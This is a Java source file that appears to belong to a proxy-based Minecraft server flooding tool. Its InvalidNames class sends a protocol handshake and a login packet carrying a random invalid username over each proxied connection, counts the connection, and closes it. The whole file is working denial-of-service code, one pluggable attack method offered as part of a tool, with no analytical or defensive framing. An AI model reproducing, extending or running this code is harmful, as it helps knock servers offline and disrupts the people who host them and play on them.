package IO.SYVERIS.methods;

import IO.SYVERIS.Main;
import IO.SYVERIS.utils.Handshake;
import IO.SYVERIS.utils.LoginRequest;
import IO.SYVERIS.utils.NettyBootstrap;
import IO.SYVERIS.utils.ProxyLoader;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.nio.charset.Charset;
import java.util.Random;

public class InvalidNames implements Method {
   private Handshake handshake;
   private byte[] bytes;

   private String randomString(int len) {
      byte[] array = new byte[len];
      (new Random()).nextBytes(array);
      return new String(array, Charset.forName("UTF-8"));
   }

   public InvalidNames() {
      this.handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
      this.bytes = this.handshake.getWrappedPacket();
   }

   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
      channel.writeAndFlush(Unpooled.buffer().writeBytes(this.bytes));
      channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(this.randomString(16))).getWrappedPacket()));
      ++NettyBootstrap.integer;
      ++NettyBootstrap.totalConnections;
      channel.close();
   }
}
